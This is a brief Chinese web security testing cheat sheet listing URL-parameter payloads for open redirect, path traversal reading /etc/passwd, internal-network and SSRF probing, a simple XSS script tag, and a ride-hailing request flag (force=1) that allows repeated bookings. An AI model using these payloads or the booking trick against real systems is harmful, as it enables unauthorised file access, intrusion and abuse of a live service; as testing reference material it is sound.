URL 跳转

```
url=http://example.com
```

任意文件读取

```
url=file///etc/passwd
filename=../../etc/passwd
```

内网爆破

```
url=http://127.0.0.1
```

ssrf

```
url=http://dnslog.cn
```

xss

```
url=<script>console.log('hacker')</script>
```

重复发包

```
打车时将 &force=0, 修改为 &force=1 可重复发包.

一个打车账号可在同一时间重复多次打车, 上车地点定在同一位置可能会造成交通拥堵.
```

